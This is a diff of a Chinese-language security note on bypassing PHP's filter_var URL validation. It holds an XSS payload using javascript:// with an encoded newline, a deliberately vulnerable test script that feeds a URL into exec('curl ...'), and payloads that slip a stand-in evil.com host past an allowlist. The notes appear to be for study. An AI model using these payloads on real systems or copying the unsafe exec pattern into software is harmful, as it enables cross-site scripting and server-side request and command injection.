@@ -1,21 +1,30 @@
-## filter_var
-filter_var — 使用特定的过滤器过滤一个变量
+# filter_var
 
+**函数结构：**
 
-
-函数结构：
 ```
 filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed
 ```
-### `FILTER_VALIDATE_URL`
-参考：
+## FILTER_VALIDATE_URL
+**参考：**
+
 - https://secure.php.net/manual/zh/function.filter-var.php
 - https://www.anquanke.com/post/id/101058
 
-**javascript**  
-`filter_var('javascript://comment%250Aalert(1)', FILTER_VALIDATE_URL);`会导致XSS攻击。因为//在JavaScript中表示单行注释，%250a解码后为换行符，所以alert(1)和//不在一行，就可以执行。
+### 利用
 
-demo
+#### javascript
+
+```php
+filter_var('javascript://comment%250Aalert(1)', FILTER_VALIDATE_URL);
+```
+
+上述代码可能会导致XSS攻击。
+
+因为`//`在JavaScript中表示单行注释，`%250a`解码后为换行符，所以`alert(1)`和`//`不在一行，js代码成功执行。
+
+**测试代码**
+
 ```php
 <?php
 $url = filter_var($_GET['url'],FILTER_VALIDATE_URL);
@@ -25,9 +34,16 @@ var_dump($url);
 echo "<a href='$url'>Next slide </a>";
 ```
 
+![1563864262526](/images/19-7-23_PHP_filter-var_filter-validate-url_1.png)
 
-**网址**  
+#### curl
+
+**利用条件**
+
+- curl<=7.47.0（win下7.55.1不可用）
+
 在如下脚本中：
+
 ```php
 <?php
    $url = $_GET['url'];
@@ -36,6 +52,7 @@ echo "<a href='$url'>Next slide </a>";
       $r = parse_url($url);
       var_dump($r);
       if(preg_match('/skysec\.top$/', $r['host'])) {
+          echo 'start curl';
          exec('curl -v -s "'.$r['host'].'"', $a);
       } else {
          echo "Error: Host not allowed";
@@ -45,32 +62,19 @@ echo "<a href='$url'>Next slide </a>";
    }
 ?>
 ```
-以前可用payload：
-```
+可用payload：
+```url
+访问evil.com:2333
 ?url=0://evil.com:23333;skysec.top:80/
-?url=0://evil$skysec.top
+访问evil.top
+?url=0://evil.com$skysec.top
+访问evil.com:80
+?url=0://evil.com:80$skysec.top
 ```
 
-但是19-7-1日测试会报错如下：
-```
-Argument: 0://192.168.1.112:82,skysec.top:80/
-C:\Users\j7ur8\Desktop\html\index.php:6:
-array(4) {
-  'scheme' =>
-  string(1) "0"
-  'host' =>
-  string(27) "192.168.1.112:82,skysec.top"
-  'port' =>
-  int(80)
-  'path' =>
-  string(1) "/"
-}
-* Rebuilt URL to: 192.168.1.112:82,skysec.top/
-* Port number ended with ','
-* Closing connection -1
-```
 
-### `FILTER_VALIDATE_EMAIL`
+
+### FILTER_VALIDATE_EMAIL
 参考：
 - https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html#0x03-filter_validate_email
 - https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly
